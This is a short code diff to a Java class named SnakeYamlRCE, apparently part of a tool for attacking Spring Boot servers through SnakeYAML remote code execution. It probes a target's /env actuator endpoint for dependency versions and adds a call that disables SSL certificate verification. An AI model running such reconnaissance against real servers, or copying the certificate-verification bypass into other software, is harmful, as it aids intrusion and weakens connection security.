@@ -8,6 +8,8 @@ import java.net.URL;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class SnakeYamlRCE {
     private String address;
     private String vpsIP;
@@ -30,6 +32,7 @@ public class SnakeYamlRCE {
     public void Result1(){
         String site = address + "/env";
         String llib = "spring-boot-starter-actuator";
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -46,7 +49,7 @@ public class SnakeYamlRCE {
                 Pattern pattern = Pattern.compile(regex);
                 Matcher matcher = pattern.matcher(response.toString());
                 if (matcher.find()) {
-                    text = String.format("spring-cloud-starter 依赖为: %s", matcher.group(1));
+                    text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                     System.out.println(text);
 //                    callback.onResult(text);
 
